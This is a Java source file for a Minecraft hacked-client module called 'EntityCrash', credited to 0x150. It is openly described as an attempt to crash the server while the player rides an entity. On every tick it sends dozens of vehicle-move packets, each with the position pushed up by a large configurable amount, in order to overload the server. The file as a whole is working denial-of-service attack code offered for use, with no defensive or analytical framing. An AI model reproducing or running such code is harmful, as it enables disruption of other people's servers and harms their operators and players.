package kult.klient.systems.modules.crash;

import kult.klient.eventbus.EventHandler;
import kult.klient.events.game.GameLeftEvent;
import kult.klient.events.world.TickEvent;
import kult.klient.settings.*;
import kult.klient.systems.modules.Categories;
import kult.klient.systems.modules.Module;
import net.minecraft.entity.Entity;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;

import java.util.Objects;

/*/--------------------------/*/
/*/ Made by 0x150            /*/
/*/ https://github.com/0x150 /*/
/*/--------------------------/*/

public class EntityCrash extends Module {
    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    // General

    private final Setting<Double> speed = sgGeneral.add(new DoubleSetting.Builder()
        .name("speed")
        .description("Speed in blocks per second.")
        .defaultValue(1337)
        .min(1)
        .sliderRange(1, 10000)
        .build()
    );

    private final Setting<Integer> amount = sgGeneral.add(new IntSetting.Builder()
        .name("amount")
        .description("How many tries per tick.")
        .defaultValue(38)
        .min(1)
        .sliderRange(1, 100)
        .build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable")
        .description("Disables the module on kick/leave.")
        .defaultValue(true)
        .build()
    );

    public EntityCrash() {
        super(Categories.Crash, Items.EGG, "entity-crash", "Tries to crash the server when you are riding an entity. (By 0x150)");
    }

    @Override
    public void onActivate() {
        if (mc.player.getVehicle() == null) {
            error("You must be riding an entity, disabling...");
            toggle();
        }
    }

    @EventHandler
    public void onTick(TickEvent.Post event) {
        Entity entity = mc.player.getVehicle();
        for (int i = 0; i < amount.get(); i++) {
            Vec3d v = entity.getPos();
            entity.setPos(v.x, v.y + speed.get(), v.z);
            VehicleMoveC2SPacket packet = new VehicleMoveC2SPacket(entity);
            Objects.requireNonNull(mc.getNetworkHandler()).sendPacket(packet);
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get()) toggle();
    }
}
